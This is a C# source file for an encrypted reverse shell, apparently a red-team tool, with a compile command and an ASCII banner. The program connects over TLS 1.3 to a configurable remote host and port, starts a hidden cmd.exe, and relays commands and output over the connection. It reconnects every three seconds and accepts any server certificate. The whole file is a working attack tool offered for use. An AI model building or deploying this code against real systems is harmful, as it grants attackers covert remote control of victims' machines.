//compile the file
//	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe STunnel_RevShell.cs

using System;
using System.Text;
using System.Net.Sockets;
using System.IO;            //for Streams
using System.Diagnostics;   //for Process
using System.Reflection;
using System.Threading;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Security.Authentication;

namespace ReverseShell2_SSL
{
    class Program
    {

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        static void Main(string[] args)
        {

            Console.WriteLine(@"

                
 _____ _____                      _  ______             _  _          _ _ 
/  ___|_   _|                    | | | ___ \           | || |        | | |
\ `--.  | |_   _ _ __  _ __   ___| | | |_/ /_____   __/ __) |__   ___| | |
 `--. \ | | | | | '_ \| '_ \ / _ \ | |    // _ \ \ / /\__ \ '_ \ / _ \ | |
/\__/ / | | |_| | | | | | | |  __/ | | |\ \  __/\ V / (   / | | |  __/ | |
\____/  \_/\__,_|_| |_|_| |_|\___|_| \_| \_\___| \_/   |_||_| |_|\___|_|_|
                                                                          
ver 1.0 Coded by GuerraIT
ver 1.1 Modified by Zinzloun (support TLS 1.3)                           
	");


            //CONFIG THIS: point to the Stunell server
            string IP = "192.168.1.2";
            int PORT = 9999;

            Console.WriteLine("Using the following connection " + IP + ":" + PORT);

            //spawn the reverse shell
            ReverseShell_SSL rsss = new ReverseShell_SSL(IP, PORT);


        }


    }

    class ReverseShell_SSL
    {

        TcpClient tcpClient;
        //NetworkStream networkStream;
        SslStream sslStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public ReverseShell_SSL(string RHost, Int32 Port)
        {

            for (; ; )
            {
                RunServer(RHost, Port);
                Thread.Sleep(3000); //Wait 3 seconds and retry
            }

        }


        private void RunServer(string rhost, Int32 port)
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect(rhost, port);

                    // Create an SSL stream that will close the client's stream.
                    sslStream = new SslStream(
                        tcpClient.GetStream(),
                        false,
                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
                        null
                        );
                    // Since we are not validating the certificate, we can pass as CN whatever we like (here host.local).
                    // Otherwise the value must match the CN of STunnel's certificate
                    sslStream.AuthenticateAsClient("host.local",
                         new X509CertificateCollection(),
                         SslProtocols.Tls13,
                         false);
                    DisplayCertificateInformation(sslStream);

                    //networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(sslStream);
                    streamWriter = new StreamWriter(sslStream);
                }
                catch (Exception) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }

        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception) { };
            streamReader.Close();
            streamWriter.Close();
            //networkStream.Close();
            sslStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }

            }
        }

        // The following method is invoked by the RemoteCertificateValidationDelegate.
        public static bool ValidateServerCertificate(
              object sender,
              X509Certificate certificate,
              X509Chain chain,
              SslPolicyErrors sslPolicyErrors)
        {


            // validate all the certificate
            return true;
        }

        static void DisplayCertificateInformation(SslStream stream)
        {
            Console.WriteLine("Certificate revocation list checked: {0}", stream.CheckCertRevocationStatus);

            // Display the properties of the client's certificate.
            X509Certificate remoteCertificate = stream.RemoteCertificate;
            if (stream.RemoteCertificate != null)
            {
                Console.WriteLine("Remote cert was issued to {0} and is valid from {1} until {2}.",
                    remoteCertificate.Subject,
                    remoteCertificate.GetEffectiveDateString(),
                    remoteCertificate.GetExpirationDateString());
            }
            else
            {
                Console.WriteLine("Remote certificate is null.");
            }
        }


    }

}
